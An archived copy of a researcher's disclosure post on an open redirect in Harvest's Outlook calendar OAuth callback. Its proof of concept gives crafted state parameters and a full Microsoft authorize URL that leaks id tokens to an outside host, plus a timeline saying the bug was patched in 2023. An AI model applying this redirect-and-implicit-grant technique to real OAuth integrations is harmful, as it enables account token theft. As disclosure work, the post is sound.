<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://eval.blog/research/microsoft-account-token-leaks-in-harvest/">Original</a>
    <h1>Stealing OAuth tokens of Microsoft accounts via open redirect in Harvest App</h1>
    
    <div id="readability-page-1" class="page"><div>
      <article>
  
  
    <blockquote>Reported an OAuth token leak via open redirect in Harvest.</blockquote>
  
  <div>
    <ul>
      <li>Posted on: <date>2023-10-21 22:33</date></li>
      <li>Reading Time: <span>4 min</span></li>
      <li>


   
    <span>Share on: </span>
</li>
    </ul>
  </div>
  
    
  
  
    
    
    
    
      <h3>Table of Contents</h3>
      <ul>
        
        <li>
          <a href="https://eval.blog/research/microsoft-account-token-leaks-in-harvest/#summary" rel="relativeanchor">Summary</a>
          
        </li>
        
        <li>
          <a href="https://eval.blog/research/microsoft-account-token-leaks-in-harvest/#proof-of-concept" rel="relativeanchor">Proof of Concept</a>
          
        </li>
        
        <li>
          <a href="https://eval.blog/research/microsoft-account-token-leaks-in-harvest/#disclosure-timeline" rel="relativeanchor">Disclosure timeline</a>
          
        </li>
        
      </ul>
    

    

    

    
  
  <blockquote>
<p>If you are coming from any link aggregrator website reading the old title &#34;Microsoft Account&#39;s OAuth tokens leaking via open redirect in Harvest&#34;, I apologise for the poor and confusing title used before. I have updated the title but I cannot change it everywhere else. Just to clarify <strong>This is not a vulnerability in Microsoft</strong>.</p>
</blockquote>
<h2 id="summary">Summary</h2>
<p>Harvest is a time-tracking software that allows users to connect their Outlook Calendar through OAuth. After a successful grant of permission, the user is redirected to <a href="https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback">https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback</a> which further redirects the user to the URL provided within the state. This leads to an open redirect which can be used to steal access tokens through an implicit grant.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>The bare open redirect which led to the token leak was found after a successful connection to Outlook calendar using OAuth application located at <a href="https://hackerone295.harvestapp.com/outlook-calendar/connect">https://hackerone295.harvestapp.com/outlook-calendar/connect</a>. The link was:</p>
<pre><code><span>https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback?state=%7b%22return_to%22:%22/%22%2c%22subdomain%22:%22hackerone295%22%7d
</span></code></pre>
<p><code>state</code> parameter in the above URL is a JSON object URI encoded:</p>
<pre data-lang="json"><code data-lang="json"><span>{&#34;</span><span>return_to</span><span>&#34;:&#34;</span><span>/</span><span>&#34;,&#34;</span><span>subdomain</span><span>&#34;:&#34;</span><span>hackerone295</span><span>&#34;}
</span></code></pre>
<p>The subdomain parameter is used to guess the main space of the Harvest app ie. <a href="http://hackerone295.harvestapp.com">hackerone295.harvestapp.com</a> in the above case. Appending a forward slash to the <code>subdomain</code> parameter leads to open redirect:</p>
<pre><code><span>https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback?state=%7b%22return_to%22:%22/%22%2c%22subdomain%22:%22example.com/%22%7d
</span></code></pre>
<p>Since the url <a href="https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback">https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback</a> is set as a redirection URL within the OAuth application, the open redirection can be used to steal the access token.</p>
<p>Combining the open redirect with implicit grant flow leaks the access tokens to the redirected URL. Implicit grant flow can be crafted as follows:</p>
<pre><code><span>https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
</span><span>client_id=0dcef4db-36d8-4aed-9cc5-ab43e1814884&amp;response_type=id_token
</span><span>&amp;redirect_uri=https%3A%2F%2Foutlook-integration.harvestapp.com%2Fauth%2Foutlook-calendar%2Fcallback?state=%7b%22return_to%22:%22/time%22%2c%22subdomain%22:%22localhost/%22%7d
</span><span>&amp;scope=openid
</span><span>&amp;response_mode=fragment
</span><span>&amp;state=1
</span><span>&amp;nonce=123456
</span></code></pre>
<p>The <code>redirect_uri</code> in the above link is the open redirect link. The <code>client_id</code> is the id of OAuth Application accessible via <a href="https://hackerone295.harvestapp.com/outlook-calendar/connect">https://hackerone295.harvestapp.com/outlook-calendar/connect</a></p>
<p>POC URL: <a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=0dcef4db-36d8-4aed-9cc5-ab43e1814884&amp;response_type=id_token&amp;redirect_uri=https%3A%2F%2Foutlook-integration.harvestapp.com%2Fauth%2Foutlook-calendar%2Fcallback?state=%7b%22return_to%22:%22/time%22%2c%22subdomain%22:%22example.com/%22%7d&amp;scope=openid&amp;response_mode=fragment&amp;state=1&amp;nonce=123456">https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=0dcef4db-36d8-4aed-9cc5-ab43e1814884&amp;response_type=id_token&amp;redirect_uri=https%3A%2F%2Foutlook-integration.harvestapp.com%2Fauth%2Foutlook-calendar%2Fcallback?state=%7b%22return_to%22:%22/time%22%2c%22subdomain%22:%22example.com/%22%7d&amp;scope=openid&amp;response_mode=fragment&amp;state=1&amp;nonce=123456</a></p>
<p>The user is redirected to:</p>
<pre><code><span>https://example.com/.harvestapp.com/auth/outlook-calendar/callback?state=%7B%22return_to%22%3A%22%2Ftime%22%2C%22subdomain%22%3A%22example.com%2F%22%7D#id_token=[your access token]&amp;state=1
</span></code></pre>
<h2 id="disclosure-timeline">Disclosure timeline</h2>
<p>In the process of disclosing and patching this vulnerability, the Harvest team was barely responsive. The company acknowledged the vulnerability by triaging but took a very long time to fix the vulnerability. After 3 years of reporting, the company finally fixed the vulnerability silently and didn&#39;t bother to inform. On 1st August 2023, I tested the vulnerability again and found it fixed. The report is still marked as triage as of 21 October 2023, and their bug bounty policy mentions rewards but no bounty or even HackerOne points were rewarded by the company. According to their HackerOne page, their average time to triage was 8 days (in 2020) but now it is nil. Hence, finally disclosing this publicly.</p>
<ul>
<li>Aug 23rd, 2020 - Reported vulnerability</li>
<li>Oct 16th, 2020 - First contact by Harvest</li>
<li>Nov 27th, 2020 - The report was triaged</li>
<li>Apr 28th, 2022 - The company said they are in the process of fixing it and gave an ETA of 2 weeks but it took them another year to fix it.</li>
<li>Aug 1st, 2023 - The vulnerability was confirmed as patched.</li>
<li>Oct 21st, 2023 - Publicly disclosed the report via this blog post.</li>
<li>Oct 22nd, 2023 - This article made quite a buzz and Harvest has apologised for the delay <a href="https://news.ycombinator.com/item?id=37978405">explaining</a> it was a human error.</li>
</ul>


      </article>
    </div></div>
  </body>
</html>
